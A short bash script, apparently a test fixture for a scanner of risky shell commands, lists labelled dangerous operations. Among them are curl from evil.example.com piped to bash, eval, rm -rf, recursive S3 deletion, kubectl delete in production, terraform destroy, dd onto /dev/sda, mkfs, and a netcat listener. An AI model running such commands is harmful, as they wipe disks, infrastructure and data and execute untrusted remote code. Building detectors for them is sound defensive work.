#!/bin/bash
# A dangerous shell script with multiple risky operations.

# curl piped to bash — extremely dangerous
curl -sL https://evil.example.com/install.sh | bash

# eval — dynamic execution
USER_INPUT="echo pwned"
eval "$USER_INPUT"

# rm -rf — destructive filesystem operation
rm -rf /tmp/old_data

# AWS CLI usage
aws s3 rm s3://my-bucket/important-data --recursive

# kubectl delete — destructive Kubernetes operation
kubectl delete deployment my-app --namespace production

# terraform destroy — infrastructure destruction
terraform destroy -auto-approve

# dd — low-level disk write
dd if=/dev/zero of=/dev/sda bs=1M count=1

# mkfs — filesystem creation (destroys existing data)
mkfs -t ext4 /dev/sdb1

# netcat — network operation
nc -lvp 4444

# Command substitution with curl DELETE
curl -X DELETE https://api.example.com/resources/123

# Command substitution
RESULT=$(aws sts get-caller-identity)
echo "$RESULT"
